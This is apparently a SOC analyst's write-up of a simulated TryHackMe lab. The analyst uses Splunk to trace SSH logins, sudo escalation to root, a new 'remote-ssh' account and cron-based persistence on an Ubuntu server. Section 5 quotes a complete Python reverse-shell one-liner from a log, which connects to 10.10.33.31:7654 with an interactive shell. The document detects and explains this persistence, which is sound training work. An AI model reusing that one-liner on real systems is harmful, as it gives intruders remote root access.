# Linux Log Investigation – SSH Account Persistence

## 1. Investigation Overview

**Project:** SOC-Analyst-SIEM-Investigation 
**Platform:** TryHackMe  
**SIEM:** Splunk  
**Room:** Log Analysis with SIEM  
**Task:** Linux Logs  
**Operating System:** Ubuntu Linux  
**Log Sources:** auth.log and syslog  
**Investigation Type:** SSH authentication, privilege escalation and persistence analysis  
**Environment:** Simulated lab environment

### Objective

Investigate an alert indicating possible persistence through the creation of a new remote SSH account on an Ubuntu server. Analyze authentication and system logs to identify the account creation, privilege escalation, source IP address, failed login activity and persistence mechanism.

---

## 2. SSH Authentication Analysis

The investigation began by reviewing SSH authentication logs in Splunk.

### Successful login

**Observed event:**

```text
2025-08-12T09:51:29.693579+00:00
sshd[2595]: Accepted password for jack-brown
from 10.14.94.82 port 54451 ssh2
```

| Field | Finding |
|---|---|
| Username | jack-brown |
| Authentication result | Successful |
| Source IP | 10.14.94.82 |
| Source port | 54451 |
| Protocol | SSH2 |
| Timestamp | 2025-08-12 09:51:29 |

### Failed login attempts

Reviewed failed SSH authentication events associated with `jack-brown`.

**Splunk search:**

```spl
index=task5 *jack-brown* *Failed password* NOT *repeated*
| spath
| stats count
```

**Observed result:** 4 failed password events.

The failed attempts occurred before the successful SSH login.

### Analysis

Multiple failed authentication attempts followed by a successful login from the same source IP are worth investigating. This activity may indicate password guessing or repeated unsuccessful authentication.

---

## 3. Privilege Escalation Analysis

After identifying the successful login, I investigated sudo activity.

**Observed event:**

```text
2025-08-12T09:52:48.713131+00:00
sudo: jack-brown :
TTY=pts/0 ;
PWD=/home/jack-brown ;
USER=root ;
COMMAND=/usr/bin/su
```

| Field | Finding |
|---|---|
| User | jack-brown |
| Target user | root |
| Command | /usr/bin/su |
| Timestamp | 2025-08-12 09:52:48 |

### Analysis

The event shows that `jack-brown` executed `/usr/bin/su` through sudo to switch to the root account.

This indicates successful execution of a privilege escalation command with root privileges.

---

## 4. New SSH Account Creation

The next investigation step was to identify the account created on the system.

**Observed sudo event:**

```text
2025-08-12T09:52:57.170059+00:00
sudo: root :
TTY=pts/1 ;
PWD=/home/jack-brown ;
USER=root ;
COMMAND=/usr/sbin/useradd remote-ssh
```

**Account creation event:**

```text
2025-08-12T09:52:57.200559+00:00
useradd[2709]: new user:
name=remote-ssh,
UID=1004,
GID=1004,
home=/home/remote-ssh,
shell=/bin/sh
```

### Account details

| Field | Finding |
|---|---|
| Username | remote-ssh |
| UID | 1004 |
| GID | 1004 |
| Home directory | /home/remote-ssh |
| Login shell | /bin/sh |
| Creation timestamp | 2025-08-12 09:52:57 |

### Analysis

The logs confirm that a new account named `remote-ssh` was created using the `useradd` utility with root privileges.

Creating an additional remote-access account can be abused to maintain access to a compromised system.

---

## 5. Cron Job and Persistence Analysis

To identify the persistence mechanism, I investigated cron-related events in Linux syslog.

**Observed event:**

```text
2025-08-12T10:00:01.270628+00:00
CRON[3042]: (root) CMD (
/usr/bin/python3 -c
'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.33.31",7654));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
>> /tmp/cron_output.log 2>&1)
```

### Important findings

| Field | Finding |
|---|---|
| Executing user | root |
| Process | CRON |
| Command interpreter | Python3 |
| Destination IP | 10.10.33.31 |
| Destination port | 7654 |
| Shell | /bin/sh |
| Output file | /tmp/cron_output.log |
| Execution timestamp | 2025-08-12 10:00:01 |

### Command analysis

The Python script performs the following actions:

1. Creates a TCP socket.
2. Connects to `10.10.33.31` on port `7654`.
3. Redirects standard input, output and error to the socket.
4. Starts an interactive shell using `/bin/sh`.
5. Redirects command output and errors to `/tmp/cron_output.log`.

### Security significance

This behavior is consistent with a reverse shell.

The cron job executes under root privileges and establishes a connection to a remote IP address. This can provide an attacker with remote command execution and continued access to the system.

---

## 6. Investigation Timeline

| Date and time (UTC) | Activity |
|---|---|
| 09:51:29 | Successful SSH login by jack-brown |
| 09:52:48 | jack-brown executed sudo su |
| 09:52:57 | remote-ssh account created |
| 10:00:01 | Root cron job executed a Python reverse-shell command |

---

## 7. Indicators of Interest

| Indicator | Value |
|---|---|
| Host | deceptipot-demo |
| Initial user | jack-brown |
| New account | remote-ssh |
| Source IP | 10.14.94.82 |
| Failed password events | 4 |
| Destination IP | 10.10.33.31 |
| Persistence port | 7654 |
| Account creation time | 2025-08-12 09:52:57 |
| Suspicious execution | Python reverse shell through cron |

---

## 8. SOC Analyst Assessment

The investigation identified a sequence of suspicious activities:

1. Repeated failed SSH authentication attempts followed by a successful login.
2. Privilege escalation from `jack-brown` to root.
3. Creation of a new Linux account named `remote-ssh`.
4. A root-level cron job executing a Python script.
5. A TCP connection from the server to `10.10.33.31:7654` with an interactive shell attached.

### Recommended response actions

- Investigate the source and destination IP addresses.
- Review SSH authentication history and account activity.
- Examine the new account's permissions and SSH access configuration.
- Inspect cron entries and scheduled command execution.
- Preserve relevant logs and evidence.
- Follow incident response procedures to contain the host and remove unauthorized persistence after appropriate verification.

---

## 9. Conclusion

Using Splunk, I investigated Linux authentication and system logs to understand suspicious SSH activity on an Ubuntu server.

The investigation identified a successful login by `jack-brown`, privilege escalation to root, creation of the `remote-ssh` account and a root-level cron job executing a Python reverse-shell command.

The cron event revealed a connection to `10.10.33.31` on port `7654`, providing evidence of suspicious remote shell activity.

This investigation provided practical experience in Linux authentication log analysis, privilege escalation detection, account creation monitoring, cron job investigation and reverse-shell identification.

---

## 10. Skills Practiced

- Linux authentication log analysis
- SSH login investigation
- Failed and successful authentication analysis
- Privilege escalation investigation
- Linux user and group creation analysis
- Cron job monitoring
- Reverse-shell identification
- Syslog analysis using Splunk
- Incident timeline development
- Security investigation documentation

**Lab classification:** Simulated TryHackMe investigation. No real enterprise incident was investigated.